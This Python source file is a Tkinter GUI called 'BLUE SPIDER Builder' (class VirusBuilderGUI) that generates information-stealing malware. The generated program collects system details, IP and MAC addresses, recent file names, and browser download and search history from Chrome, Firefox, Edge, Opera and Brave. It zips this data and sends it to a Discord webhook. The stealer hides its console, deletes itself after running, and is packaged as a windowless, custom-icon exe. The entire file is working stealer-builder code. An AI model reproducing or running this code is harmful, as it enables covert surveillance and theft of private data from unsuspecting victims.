import os
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import subprocess
import sys
import platform
import getpass
import uuid
import re
import requests
import shutil
import threading
import zipfile
from datetime import datetime, timedelta

class VirusBuilderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("BLUE SPIDER Builder v8.0 - Complete Browser History")
        self.root.geometry("720x680")
        self.root.minsize(680, 630)
        self.root.resizable(True, True)
        
        # Configuration du thème bleu ciel
        self.setup_theme()
        
        # Détection automatique du nom d'utilisateur
        self.username = getpass.getuser()
        self.base_path = f"C:\\Users\\{self.username}\\OneDrive\\Bureau\\BLUE_SPIDER_free"
        self.output_path = os.path.join(self.base_path, "1-Output")
        
        # Créer le dossier de sortie s'il n'existe pas
        os.makedirs(self.output_path, exist_ok=True)
        
        self.setup_ui()
        
    def setup_theme(self):
        """Configuration du thème bleu ciel"""
        self.colors = {
            'bg_dark': '#1a1a1a',
            'bg_medium': '#2d2d2d',
            'bg_light': '#3d3d3d',
            'fg_white': '#ffffff',
            'fg_gray': '#cccccc',
            'accent_blue': '#00a8ff',
            'accent_blue_light': '#7ed6df',
            'accent_blue_dark': '#192a56',
            'success_green': '#4cd137',
            'error_red': '#e84118',
            'warning_yellow': '#fbc531'
        }
        
        self.root.configure(bg=self.colors['bg_dark'])
        
    def setup_ui(self):
        # Frame principale
        main_frame = tk.Frame(self.root, bg=self.colors['bg_dark'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # En-tête
        header_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        header_frame.pack(fill=tk.X, pady=(0, 15))
        
        title_label = tk.Label(header_frame, text="BLUE SPIDER", 
                              font=('Arial', 28, 'bold'),
                              fg=self.colors['accent_blue'],
                              bg=self.colors['bg_dark'])
        title_label.pack(side=tk.LEFT)
        
        version_label = tk.Label(header_frame, text="v8.0 - Complete History", 
                                font=('Arial', 12),
                                fg=self.colors['fg_gray'],
                                bg=self.colors['bg_dark'])
        version_label.pack(side=tk.LEFT, padx=(10, 0))
        
        # Séparateur
        separator = tk.Frame(main_frame, height=1, bg=self.colors['bg_light'])
        separator.pack(fill=tk.X, pady=(0, 20))
        
        # Configuration Webhook
        webhook_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        webhook_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(webhook_frame, text="Discord Webhook:", 
                fg=self.colors['fg_white'],
                bg=self.colors['bg_dark'],
                font=('Arial', 11)).pack(anchor=tk.W)
        
        webhook_input_frame = tk.Frame(webhook_frame, bg=self.colors['bg_dark'])
        webhook_input_frame.pack(fill=tk.X, pady=5)
        
        self.webhook_url = tk.StringVar()
        webhook_entry = tk.Entry(webhook_input_frame, 
                                textvariable=self.webhook_url,
                                bg=self.colors['bg_medium'],
                                fg=self.colors['fg_white'],
                                insertbackground=self.colors['fg_white'],
                                relief=tk.FLAT,
                                font=('Arial', 10),
                                width=60)
        webhook_entry.pack(side=tk.LEFT, padx=(0, 10), fill=tk.X, expand=True)
        
        test_btn = tk.Button(webhook_input_frame, text="Test", 
                           command=self.test_webhook,
                           bg=self.colors['accent_blue'],
                           fg=self.colors['fg_white'],
                           relief=tk.FLAT,
                           padx=15,
                           pady=5,
                           cursor='hand2',
                           font=('Arial', 10))
        test_btn.pack(side=tk.RIGHT)
        
        # Options de collecte
        options_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        options_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(options_frame, text="Options de collecte:", 
                fg=self.colors['fg_white'],
                bg=self.colors['bg_dark'],
                font=('Arial', 11, 'bold')).pack(anchor=tk.W, pady=(0, 10))
        
        self.options = {}
        
        # Option 1: Informations système
        sys_frame = tk.Frame(options_frame, bg=self.colors['bg_medium'], relief=tk.FLAT, bd=1)
        sys_frame.pack(fill=tk.X, pady=5)
        
        sys_header = tk.Frame(sys_frame, bg=self.colors['bg_light'])
        sys_header.pack(fill=tk.X, padx=1, pady=1)
        
        self.options["system_info"] = tk.BooleanVar(value=True)
        sys_check = tk.Checkbutton(sys_header, 
                                  text="📊 INFORMATIONS SYSTÈME",
                                  variable=self.options["system_info"],
                                  bg=self.colors['bg_light'],
                                  fg=self.colors['fg_white'],
                                  selectcolor=self.colors['bg_light'],
                                  activebackground=self.colors['bg_light'],
                                  font=('Arial', 11, 'bold'))
        sys_check.pack(side=tk.LEFT, padx=10, pady=8)
        
        sys_desc = tk.Label(sys_frame, 
                          text="  • Nom d'utilisateur • Nom du PC • IP • OS • MAC",
                          bg=self.colors['bg_medium'],
                          fg=self.colors['fg_gray'],
                          justify=tk.LEFT,
                          font=('Arial', 9))
        sys_desc.pack(anchor=tk.W, padx=30, pady=8)
        
        # Option 2: Fichiers récents
        files_frame = tk.Frame(options_frame, bg=self.colors['bg_medium'], relief=tk.FLAT, bd=1)
        files_frame.pack(fill=tk.X, pady=5)
        
        files_header = tk.Frame(files_frame, bg=self.colors['bg_light'])
        files_header.pack(fill=tk.X, padx=1, pady=1)
        
        self.options["recent_files"] = tk.BooleanVar(value=True)
        files_check = tk.Checkbutton(files_header, 
                                    text="📁 FICHIERS RÉCENTS (30 jours - noms)",
                                    variable=self.options["recent_files"],
                                    bg=self.colors['bg_light'],
                                    fg=self.colors['fg_white'],
                                    selectcolor=self.colors['bg_light'],
                                    activebackground=self.colors['bg_light'],
                                    font=('Arial', 11, 'bold'))
        files_check.pack(side=tk.LEFT, padx=10, pady=8)
        
        files_desc = tk.Label(files_frame, 
                            text="  • Desktop, Documents, Downloads\n  • Noms et chemins des fichiers modifiés récemment",
                            bg=self.colors['bg_medium'],
                            fg=self.colors['fg_gray'],
                            justify=tk.LEFT,
                            font=('Arial', 9))
        files_desc.pack(anchor=tk.W, padx=30, pady=8)
        
        # Option 3: Historique complet des navigateurs
        history_frame = tk.Frame(options_frame, bg=self.colors['bg_medium'], relief=tk.FLAT, bd=1)
        history_frame.pack(fill=tk.X, pady=5)
        
        history_header = tk.Frame(history_frame, bg=self.colors['bg_light'])
        history_header.pack(fill=tk.X, padx=1, pady=1)
        
        self.options["browser_history"] = tk.BooleanVar(value=True)
        history_check = tk.Checkbutton(history_header, 
                                      text="🌐 HISTORIQUE COMPLET (téléchargements + recherche)",
                                      variable=self.options["browser_history"],
                                      bg=self.colors['bg_light'],
                                      fg=self.colors['fg_white'],
                                      selectcolor=self.colors['bg_light'],
                                      activebackground=self.colors['bg_light'],
                                      font=('Arial', 11, 'bold'))
        history_check.pack(side=tk.LEFT, padx=10, pady=8)
        
        history_desc = tk.Label(history_frame, 
                              text="  • Chrome • Firefox • Edge • Opera • Brave\n  • Historique de téléchargements + Historique de recherche\n  • URLs visitées • Mots-clés recherchés",
                              bg=self.colors['bg_medium'],
                              fg=self.colors['fg_gray'],
                              justify=tk.LEFT,
                              font=('Arial', 9))
        history_desc.pack(anchor=tk.W, padx=30, pady=8)
        
        # Séparateur
        separator2 = tk.Frame(main_frame, height=1, bg=self.colors['bg_light'])
        separator2.pack(fill=tk.X, pady=15)
        
        # Configuration du fichier
        config_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        config_frame.pack(fill=tk.X, pady=(0, 15))
        
        # Nom du fichier
        name_frame = tk.Frame(config_frame, bg=self.colors['bg_dark'])
        name_frame.pack(fill=tk.X, pady=2)
        
        tk.Label(name_frame, text="File Name:", 
                fg=self.colors['fg_white'], 
                bg=self.colors['bg_dark'],
                width=12, anchor='w',
                font=('Arial', 10)).pack(side=tk.LEFT)
        
        self.filename = tk.StringVar(value="collector")
        name_entry = tk.Entry(name_frame, 
                            textvariable=self.filename,
                            bg=self.colors['bg_medium'],
                            fg=self.colors['fg_white'],
                            insertbackground=self.colors['fg_white'],
                            relief=tk.FLAT,
                            width=30)
        name_entry.pack(side=tk.LEFT, padx=(0, 10))
        
        # Type de fichier
        type_frame = tk.Frame(config_frame, bg=self.colors['bg_dark'])
        type_frame.pack(fill=tk.X, pady=2)
        
        tk.Label(type_frame, text="File Type:", 
                fg=self.colors['fg_white'], 
                bg=self.colors['bg_dark'],
                width=12, anchor='w',
                font=('Arial', 10)).pack(side=tk.LEFT)
        
        self.file_type = tk.StringVar(value="exe")
        type_combo = ttk.Combobox(type_frame, 
                                  textvariable=self.file_type,
                                  values=["exe", "py"],
                                  width=28,
                                  state='readonly')
        type_combo.pack(side=tk.LEFT)
        
        # Icône
        icon_frame = tk.Frame(config_frame, bg=self.colors['bg_dark'])
        icon_frame.pack(fill=tk.X, pady=2)
        
        tk.Label(icon_frame, text="Icon (.ico):", 
                fg=self.colors['fg_white'], 
                bg=self.colors['bg_dark'],
                width=12, anchor='w',
                font=('Arial', 10)).pack(side=tk.LEFT)
        
        self.icon_path = tk.StringVar()
        icon_entry = tk.Entry(icon_frame, 
                            textvariable=self.icon_path,
                            bg=self.colors['bg_medium'],
                            fg=self.colors['fg_white'],
                            insertbackground=self.colors['fg_white'],
                            relief=tk.FLAT,
                            width=23)
        icon_entry.pack(side=tk.LEFT, padx=(0, 5))
        
        browse_btn = tk.Button(icon_frame, text="Browse", 
                             command=self.browse_icon,
                             bg=self.colors['bg_light'],
                             fg=self.colors['fg_white'],
                             relief=tk.FLAT,
                             padx=10,
                             cursor='hand2')
        browse_btn.pack(side=tk.LEFT)
        
        # Auto-suppression
        autodelete_frame = tk.Frame(config_frame, bg=self.colors['bg_dark'])
        autodelete_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(autodelete_frame, text="Auto-delete:", 
                fg=self.colors['fg_white'], 
                bg=self.colors['bg_dark'],
                width=12, anchor='w',
                font=('Arial', 10)).pack(side=tk.LEFT)
        
        self.auto_delete = tk.BooleanVar(value=True)
        autodelete_check = tk.Checkbutton(autodelete_frame, 
                                        text="Supprimer après exécution",
                                        variable=self.auto_delete,
                                        bg=self.colors['bg_dark'],
                                        fg=self.colors['fg_white'],
                                        selectcolor=self.colors['bg_dark'],
                                        activebackground=self.colors['bg_dark'])
        autodelete_check.pack(side=tk.LEFT)
        
        # Bouton Build
        build_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        build_frame.pack(pady=15)
        
        self.build_btn = tk.Button(build_frame, text="🚀 GÉNÉRER", 
                                  command=self.generate_file_thread,
                                  bg=self.colors['accent_blue'],
                                  fg=self.colors['fg_white'],
                                  font=('Arial', 12, 'bold'),
                                  relief=tk.FLAT,
                                  padx=30,
                                  pady=10,
                                  cursor='hand2',
                                  width=20)
        self.build_btn.pack()
        
        # Console
        console_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        console_frame.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
        self.console = tk.Text(console_frame, 
                              height=8,
                              bg=self.colors['bg_medium'],
                              fg=self.colors['fg_white'],
                              insertbackground=self.colors['fg_white'],
                              relief=tk.FLAT,
                              font=('Consolas', 9))
        self.console.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        console_scrollbar = tk.Scrollbar(console_frame, 
                                        bg=self.colors['bg_light'],
                                        troughcolor=self.colors['bg_dark'])
        console_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.console.config(yscrollcommand=console_scrollbar.set)
        console_scrollbar.config(command=self.console.yview)
        
        # Status bar
        status_frame = tk.Frame(main_frame, bg=self.colors['bg_medium'], height=25)
        status_frame.pack(fill=tk.X, pady=(10, 0))
        
        self.status_label = tk.Label(status_frame, text="Prêt - Historique complet des navigateurs", 
                                    bg=self.colors['bg_medium'],
                                    fg=self.colors['fg_gray'],
                                    anchor=tk.W)
        self.status_label.pack(side=tk.LEFT, padx=10)
        
        self.output_path_label = tk.Label(status_frame, text=f"Output: {self.output_path}", 
                                        bg=self.colors['bg_medium'],
                                        fg=self.colors['accent_blue'],
                                        anchor=tk.E)
        self.output_path_label.pack(side=tk.RIGHT, padx=10)
        
    def log(self, message, msg_type="info"):
        colors = {
            "info": self.colors['fg_white'],
            "success": self.colors['success_green'],
            "error": self.colors['error_red'],
            "warning": self.colors['warning_yellow']
        }
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.insert(tk.END, f"[{timestamp}] {message}\n")
        self.console.see(tk.END)
        self.root.update()
        self.status_label.config(text=message[:50] + "..." if len(message) > 50 else message)
        
    def test_webhook(self):
        webhook = self.webhook_url.get().strip()
        if not webhook:
            messagebox.showerror("Erreur", "Veuillez entrer une URL de webhook")
            return
            
        self.log(f"🔍 Test du webhook...")
        
        try:
            data = {"content": "✅ Test réussi depuis BLUE SPIDER v8.0"}
            response = requests.post(webhook, json=data, timeout=10)
            
            if response.status_code == 204:
                self.log("✅ Webhook fonctionnel!", "success")
                messagebox.showinfo("Succès", "Webhook testé avec succès!")
            else:
                self.log(f"❌ Erreur HTTP: {response.status_code}", "error")
                messagebox.showerror("Erreur", f"Erreur HTTP: {response.status_code}")
        except Exception as e:
            self.log(f"❌ Erreur: {str(e)}", "error")
            messagebox.showerror("Erreur", f"Erreur: {str(e)}")
            
    def browse_icon(self):
        filename = filedialog.askopenfilename(
            title="Sélectionner une icône .ico",
            filetypes=[("Fichiers ICO", "*.ico"), ("Tous les fichiers", "*.*")]
        )
        if filename:
            self.icon_path.set(filename)
            self.log(f"📁 Icône sélectionnée: {filename}")
            
    def generate_file_thread(self):
        thread = threading.Thread(target=self.generate_file)
        thread.daemon = True
        thread.start()
            
    def generate_file(self):
        self.build_btn.config(state=tk.DISABLED, bg=self.colors['bg_light'])
        
        try:
            selected_options = [key for key, var in self.options.items() if var.get()]
            
            if not selected_options:
                messagebox.showerror("Erreur", "Veuillez sélectionner au moins une option")
                return
                
            webhook = self.webhook_url.get().strip()
            if not webhook:
                messagebox.showerror("Erreur", "Veuillez entrer une URL de webhook")
                return
                
            filename = self.filename.get().strip()
            if not filename:
                filename = "collector"
                
            filename = re.sub(r'[^\w\-_\. ]', '_', filename)
            icon_path = self.icon_path.get().strip()
            file_type = self.file_type.get()
            auto_delete = self.auto_delete.get()
            
            self.log("="*60)
            self.log("🚀 GÉNÉRATION DU COLLECTOR", "success")
            self.log("="*60)
            self.log(f"📊 Options: {', '.join(selected_options)}")
            
            source_code = self.generate_source_code(selected_options, webhook, auto_delete)
            
            py_file = os.path.join(self.output_path, f"{filename}.py")
            with open(py_file, 'w', encoding='utf-8') as f:
                f.write(source_code)
                
            self.log(f"✅ Fichier Python généré: {py_file}", "success")
            
            if file_type == "exe":
                self.convert_to_exe(py_file, filename, icon_path)
            else:
                self.log("\n✅ Fichier généré avec succès!", "success")
                messagebox.showinfo("Succès", f"Fichier généré!\n\nEmplacement: {py_file}")
                    
        except Exception as e:
            self.log(f"❌ Erreur: {str(e)}", "error")
            messagebox.showerror("Erreur", f"Erreur: {str(e)}")
            
        finally:
            self.build_btn.config(state=tk.NORMAL, bg=self.colors['accent_blue'])
    
    def generate_source_code(self, selected_options, webhook, auto_delete):
        code = f'''import os
import sys
import platform
import getpass
import socket
import uuid
import requests
from datetime import datetime, timedelta
import tempfile
import shutil
import sqlite3
import time
import threading
import zipfile

# Configuration
WEBHOOK_URL = "{webhook}"
TEMP_DIR = tempfile.mkdtemp()
RESULTS_DIR = os.path.join(TEMP_DIR, "results")
os.makedirs(RESULTS_DIR, exist_ok=True)

# ============= FONCTIONS DE BASE =============

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=3).text
    except:
        return "Non disponible"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return socket.gethostbyname(socket.gethostname())

def get_mac_address():
    try:
        return ':'.join(['{{:02x}}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    except:
        return "Non disponible"

def get_system_info():
    info = []
    info.append("=== INFORMATIONS SYSTEME ===")
    info.append(f"Date: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}")
    info.append(f"Utilisateur: {{getpass.getuser()}}")
    info.append(f"Hostname: {{socket.gethostname()}}")
    info.append(f"OS: {{platform.system()}} {{platform.release()}}")
    info.append(f"Architecture: {{platform.machine()}}")
    info.append(f"Processeur: {{platform.processor()}}")
    info.append(f"IP Locale: {{get_local_ip()}}")
    info.append(f"IP Publique: {{get_public_ip()}}")
    info.append(f"MAC Address: {{get_mac_address()}}")
    return "\\n".join(info)

def get_recent_files():
    files = []
    paths = [
        os.path.expanduser("~\\\\Desktop"),
        os.path.expanduser("~\\\\Documents"),
        os.path.expanduser("~\\\\Downloads"),
    ]
    cutoff = datetime.now() - timedelta(days=30)
    
    for path in paths:
        if os.path.exists(path):
            files.append(f"\\n--- {{path}} ---")
            try:
                for root, dirs, filenames in os.walk(path):
                    for f in filenames[:20]:
                        try:
                            p = os.path.join(root, f)
                            if datetime.fromtimestamp(os.path.getmtime(p)) > cutoff:
                                files.append(p)
                        except:
                            pass
            except:
                pass
    
    result = "=== FICHIERS RECENTS (30 JOURS) ===\\n"
    result += "\\n".join(files[:200])
    return result

def get_browser_downloads():
    downloads = []
    downloads_file = os.path.join(RESULTS_DIR, "downloads_history.txt")
    
    # Chrome
    chrome = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History")
    if os.path.exists(chrome):
        try:
            temp = os.path.join(TEMP_DIR, "chrome.db")
            shutil.copy2(chrome, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT target_path, start_time, tab_url FROM downloads ORDER BY start_time DESC LIMIT 30")
            for row in c.fetchall():
                downloads.append(f"Chrome - Fichier: {{row[0]}} | URL: {{row[2] if row[2] else 'N/A'}}")
            conn.close()
            os.remove(temp)
        except:
            downloads.append("Chrome: Erreur de lecture")
    
    # Firefox
    firefox = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles")
    if os.path.exists(firefox):
        try:
            for profile in os.listdir(firefox):
                if profile.endswith('.default-release'):
                    places = os.path.join(firefox, profile, "places.sqlite")
                    if os.path.exists(places):
                        temp = os.path.join(TEMP_DIR, "firefox.db")
                        shutil.copy2(places, temp)
                        conn = sqlite3.connect(temp)
                        c = conn.cursor()
                        c.execute("SELECT url, content FROM moz_places WHERE url LIKE '%download%' LIMIT 30")
                        for row in c.fetchall():
                            downloads.append(f"Firefox - URL: {{row[0][:100]}}")
                        conn.close()
                        os.remove(temp)
                        break
        except:
            downloads.append("Firefox: Erreur de lecture")
    
    # Edge
    edge = os.path.expanduser("~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\History")
    if os.path.exists(edge):
        try:
            temp = os.path.join(TEMP_DIR, "edge.db")
            shutil.copy2(edge, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 30")
            for row in c.fetchall():
                downloads.append(f"Edge - Fichier: {{row[0]}} | URL: {{row[1] if row[1] else 'N/A'}}")
            conn.close()
            os.remove(temp)
        except:
            downloads.append("Edge: Erreur de lecture")
    
    # Opera
    opera = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\History")
    if os.path.exists(opera):
        try:
            temp = os.path.join(TEMP_DIR, "opera.db")
            shutil.copy2(opera, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 30")
            for row in c.fetchall():
                downloads.append(f"Opera - Fichier: {{row[0]}} | URL: {{row[1] if row[1] else 'N/A'}}")
            conn.close()
            os.remove(temp)
        except:
            downloads.append("Opera: Erreur de lecture")
    
    # Brave
    brave = os.path.expanduser("~\\\\AppData\\\\Local\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\History")
    if os.path.exists(brave):
        try:
            temp = os.path.join(TEMP_DIR, "brave.db")
            shutil.copy2(brave, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 30")
            for row in c.fetchall():
                downloads.append(f"Brave - Fichier: {{row[0]}} | URL: {{row[1] if row[1] else 'N/A'}}")
            conn.close()
            os.remove(temp)
        except:
            downloads.append("Brave: Erreur de lecture")
    
    with open(downloads_file, 'w', encoding='utf-8') as f:
        f.write("=== HISTORIQUE DES TELECHARGEMENTS ===\\n\\n")
        f.write("\\n".join(downloads))
    
    return downloads_file

def get_browser_search_history():
    searches = []
    searches_file = os.path.join(RESULTS_DIR, "search_history.txt")
    
    # Chrome
    chrome = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History")
    if os.path.exists(chrome):
        try:
            temp = os.path.join(TEMP_DIR, "chrome_search.db")
            shutil.copy2(chrome, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            # Recherche Google, Youtube, etc.
            c.execute("SELECT url, title, last_visit_time FROM urls WHERE url LIKE '%google.com/search%' OR url LIKE '%youtube.com/results%' OR url LIKE '%bing.com/search%' OR url LIKE '%yahoo.com/search%' ORDER BY last_visit_time DESC LIMIT 50")
            for row in c.fetchall():
                searches.append(f"Chrome - {{row[1]}} | {{row[0][:100]}}")
            conn.close()
            os.remove(temp)
        except:
            searches.append("Chrome: Erreur de lecture")
    
    # Firefox
    firefox = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles")
    if os.path.exists(firefox):
        try:
            for profile in os.listdir(firefox):
                if profile.endswith('.default-release'):
                    places = os.path.join(firefox, profile, "places.sqlite")
                    if os.path.exists(places):
                        temp = os.path.join(TEMP_DIR, "firefox_search.db")
                        shutil.copy2(places, temp)
                        conn = sqlite3.connect(temp)
                        c = conn.cursor()
                        c.execute("SELECT url, title FROM moz_places WHERE url LIKE '%google.com/search%' OR url LIKE '%youtube.com/results%' OR url LIKE '%bing.com/search%' LIMIT 50")
                        for row in c.fetchall():
                            searches.append(f"Firefox - {{row[1]}} | {{row[0][:100]}}")
                        conn.close()
                        os.remove(temp)
                        break
        except:
            searches.append("Firefox: Erreur de lecture")
    
    # Edge
    edge = os.path.expanduser("~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\History")
    if os.path.exists(edge):
        try:
            temp = os.path.join(TEMP_DIR, "edge_search.db")
            shutil.copy2(edge, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT url, title FROM urls WHERE url LIKE '%google.com/search%' OR url LIKE '%bing.com/search%' ORDER BY last_visit_time DESC LIMIT 50")
            for row in c.fetchall():
                searches.append(f"Edge - {{row[1]}} | {{row[0][:100]}}")
            conn.close()
            os.remove(temp)
        except:
            searches.append("Edge: Erreur de lecture")
    
    with open(searches_file, 'w', encoding='utf-8') as f:
        f.write("=== HISTORIQUE DE RECHERCHE ===\\n\\n")
        f.write("\\n".join(searches))
    
    return searches_file

def send_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            requests.post(WEBHOOK_URL, files={{"file": f}}, timeout=10)
        return True
    except:
        return False

def create_zip_report():
    zip_path = os.path.join(TEMP_DIR, "Complete_Report.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(RESULTS_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, RESULTS_DIR)
                zipf.write(file_path, arcname)
    return zip_path

# ============= MAIN =============

def main():
    try:
        # Masquer console
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        results = {{}}
        
        # Collecte
'''

        if "system_info" in selected_options:
            code += '''
        # Informations système
        sys_info = get_system_info()
        sys_file = os.path.join(RESULTS_DIR, "system_info.txt")
        with open(sys_file, 'w', encoding='utf-8') as f:
            f.write(sys_info)
        results['system'] = sys_file
'''
        if "recent_files" in selected_options:
            code += '''
        # Fichiers récents
        recent_files = get_recent_files()
        files_file = os.path.join(RESULTS_DIR, "recent_files.txt")
        with open(files_file, 'w', encoding='utf-8') as f:
            f.write(recent_files)
        results['files'] = files_file
'''
        if "browser_history" in selected_options:
            code += '''
        # Historique des téléchargements (en thread)
        def collect_downloads():
            results['downloads'] = get_browser_downloads()
        
        # Historique de recherche (en thread)
        def collect_searches():
            results['searches'] = get_browser_search_history()
        
        td = threading.Thread(target=collect_downloads)
        ts = threading.Thread(target=collect_searches)
        td.start()
        ts.start()
        td.join(timeout=4)
        ts.join(timeout=4)
'''

        code += '''
        # Création du ZIP récapitulatif
        zip_report = create_zip_report()
        
        # Envoi du ZIP final
        if os.path.exists(zip_report):
            send_file(zip_report)
        
        # Nettoyage
        shutil.rmtree(TEMP_DIR, ignore_errors=True)
        
    except Exception as e:
        pass
'''

        if auto_delete:
            code += '''
    # Auto-suppression
    try:
        time.sleep(2)
        os.remove(sys.argv[0])
    except:
        pass
'''

        code += '''
if __name__ == "__main__":
    main()
'''
        return code
    
    def convert_to_exe(self, py_file, filename, icon_path):
        self.log("\n🔄 Conversion en exécutable...")
        
        try:
            import PyInstaller.__main__
            
            args = [
                py_file,
                '--onefile',
                '--noconsole',
                '--name', filename,
                '--distpath', self.output_path,
                '--workpath', os.path.join(self.output_path, 'build'),
                '--specpath', self.output_path,
                '--clean'
            ]
            
            if icon_path and os.path.exists(icon_path):
                args.extend(['--icon', icon_path])
                
            self.log("⚙️ Compilation...")
            PyInstaller.__main__.run(args)
            
            exe_path = os.path.join(self.output_path, f"{filename}.exe")
            if os.path.exists(exe_path):
                self.log(f"✅ Exécutable généré: {exe_path}", "success")
                
                # Nettoyage
                for f in os.listdir(self.output_path):
                    if f.endswith('.spec'):
                        os.remove(os.path.join(self.output_path, f))
                build_dir = os.path.join(self.output_path, 'build')
                if os.path.exists(build_dir):
                    shutil.rmtree(build_dir)
                
                if messagebox.askyesno("Succès", f"Fichier généré!\n\nEmplacement: {exe_path}\n\nCe collector va :\n• Collecter les infos système\n• Lister les fichiers récents\n• Récupérer l'historique des téléchargements\n• Récupérer l'historique de recherche\n• Créer un ZIP récapitulatif\n• Envoyer le ZIP sur Discord\n\nOuvrir le dossier ?"):
                    os.startfile(self.output_path)
            else:
                self.log("❌ Erreur de génération", "error")
                
        except ImportError:
            self.log("❌ PyInstaller non installé", "error")
            messagebox.showerror("Erreur", "PyInstaller n'est pas installé.\nInstallez-le avec: pip install pyinstaller")
        except Exception as e:
            self.log(f"❌ Erreur: {str(e)}", "error")
            messagebox.showerror("Erreur", f"Erreur: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = VirusBuilderGUI(root)
    root.mainloop()